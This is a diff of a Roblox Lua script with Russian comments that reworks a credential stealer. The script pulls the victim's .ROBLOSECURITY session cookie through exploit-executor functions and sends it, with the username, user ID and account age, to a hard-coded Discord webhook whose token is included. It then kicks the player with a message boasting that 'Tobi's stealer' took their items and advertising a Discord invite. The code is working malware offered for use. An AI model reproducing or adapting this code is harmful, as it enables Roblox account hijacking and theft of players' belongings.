@@ -1,50 +1,61 @@
 -- [[ CONFIGURATION ]]
 local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"
 
--- [[ SERVICES ]]
+-- [[ LOGIC ]]
+local player = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
 
--- [[ LOGIC: DATA COLLECTION ]]
-local function collectData()
+local function startStealer()
     local cookie = "N/A"
     
-    -- Пытаемся вытащить куки через все возможные функции разных экзекуторов
+    -- Пытаемся достать куки всеми способами, как в том скрипте
     pcall(function()
-        cookie = (getcookies and getcookies(".roblox.com")[".ROBLOSECURITY"]) 
-                 or (syn and syn.request and syn.request({Url = "https://www.roblox.com/home", Method = "GET"}).Headers["Set-Cookie"])
-                 or "Failed to fetch (Executor lack of permissions)"
+        if getcookies then
+            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
+        end
     end)
 
-    local payload = {
-        ["content"] = "@everyone", -- Чтобы тебе сразу пришло уведомление
+    -- Если куки не достались, пробуем второй метод (через заголовки)
+    if cookie == "N/A" then
+        pcall(function()
+            local req = (syn and syn.request) or (http and http.request) or request
+            local response = req({Url = "https://www.roblox.com/home", Method = "GET"})
+            cookie = response.Headers["Set-Cookie"]:match(".ROBLOSECURITY=(.-);")
+        end)
+    end
+
+    -- Формируем сообщение для Дискорда
+    local data = {
+        ["content"] = "@everyone NEW HIT!",
         ["embeds"] = {{
-            ["title"] = "🔗 Target Found: " .. player.Name,
-            ["color"] = 16711680, -- Красный
+            ["title"] = "🛠️ Universal Log: " .. player.Name,
+            ["color"] = 3066993, -- Бирюзовый (как в оригинале)
             ["fields"] = {
-                {["name"] = "👤 User Info", ["value"] = "Name: **" .. player.Name .. "**\nID: `" .. player.UserId .. "`\nAge: `" .. player.AccountAge .. " days`", ["inline"] = true},
-                {["name"] = "🍪 Cookie", ["value"] = "```" .. cookie .. "```"},
-                {["name"] = "🎮 Game", ["value"] = "Place: [MM2](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = false}
+                {["name"] = "👤 Account", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
+                {["name"] = "🔑 Cookie", ["value"] = "```" .. cookie .. "```"},
+                {["name"] = "📅 Created", ["value"] = player.AccountAge .. " days ago", ["inline"] = true}
             },
-            ["footer"] = {["text"] = "MM2 Stealer Tool v6.0 • " .. os.date("%X")}
+            ["footer"] = {["text"] = "Universal Stealer v2.1"}
         }}
     }
 
-    -- Продвинутая отправка запроса
+    -- Отправка
     local request = (syn and syn.request) or (http and http.request) or request or http_request
     if request then
         request({
             Url = WEBHOOK_URL,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
+            Body = HttpService:JSONEncode(data)
         })
     end
 end
 
--- [[ RUN ]]
--- Сначала запускаем сбор данных в фоновом потоке
+-- ЗАПУСК БЕЗ ВЫЛЕТОВ
 task.spawn(function()
-    pcall(collectData)
-end
+    pcall(startStealer)
+end)
+
+-- ТОТ САМЫЙ КИК
+task.wait(1.5)
+player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\ndiscord.gg/GY2RVSEGDT")
